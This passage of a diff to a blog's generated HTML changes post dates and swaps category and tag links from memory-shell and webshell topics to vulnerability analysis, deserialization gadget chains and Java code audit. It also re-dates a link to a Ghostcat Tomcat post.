-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-15
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-category">
-                                    内存马
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                    漏洞分析
                                 </a>
                             
-                            <a href="/categories/%E5%86%85%E5%AD%98%E9%A9%AC/webshell/" class="post-category">
-                                    webshell
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="post-category">
+                                    反序列化利用链
                                 </a>
                             
                             
@@ -729,16 +729,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/webshell/">
-                        <span class="chip bg-color">webshell</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
+                        <span class="chip bg-color">反序列化利用链</span>
                     </a>
                     
-                    <a href="/tags/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/">
-                        <span class="chip bg-color">远控木马</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
-                        <span class="chip bg-color">内存马</span>
+                    <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">Java代码审计</span>
                     </a>
                     
                 </div>
@@ -752,7 +748,7 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/12/Ghostcat-Tomcat/">
+                <a href="/2021/06/28/Ghostcat-Tomcat/">
                     <div class="card-image">
                         
                         
@@ -769,7 +765,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-28
                             </span>
                         <span class="publish-author">
                             
